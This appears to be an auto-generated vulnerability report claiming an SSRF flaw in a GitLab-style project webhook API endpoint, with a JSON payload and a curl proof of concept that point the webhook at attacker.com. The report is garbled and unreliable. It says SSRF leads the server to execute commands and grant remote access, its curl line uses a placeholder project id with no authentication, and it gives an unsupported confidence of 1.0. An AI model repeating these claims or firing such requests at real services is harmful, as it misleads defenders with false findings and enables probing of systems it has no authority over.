attack:
## TITLE: Unpatched Webhook Vulnerability
TARGET: POST /api/v4/projects/:id/hooks
TECHNIQUE: SSRF via webhook or import URL
STEPS:
1. An attacker sends a POST request to the `/api/v4/projects/:id/hooks` endpoint with a specially crafted payload that includes a webhook URL pointing to a vulnerable server. This could be a remote server with an open port or an internal server configured to respond to arbitrary requests. For example: 
    ```
    POST /api/v4/projects/:id/hooks
    Content-Type: application/json
    body:
    {
        "url": "http://attacker.com:443/vulnerable_endpoint"
    }
    ```
2. The server receives this request and, due to a lack of proper input sanitization, processes the URL as an actual HTTP request to the specified endpoint. 
3. The server then proceeds to execute the command specified in the URL, granting the attacker remote access to the target server.
PROOF OF CONCEPT:
```
curl -X POST -d '{"url": "http://attacker.com:443/target_endpoint"}' http://gitlab.com/api/v4/projects/:id/hooks
```
EXPECTED IMPACT: The attacker can potentially access and exploit data on the target server.  
CONFIDENCE: 1.0

evaluation.strength: SSRF vulnerability can be exploited to gain remote access to the target server
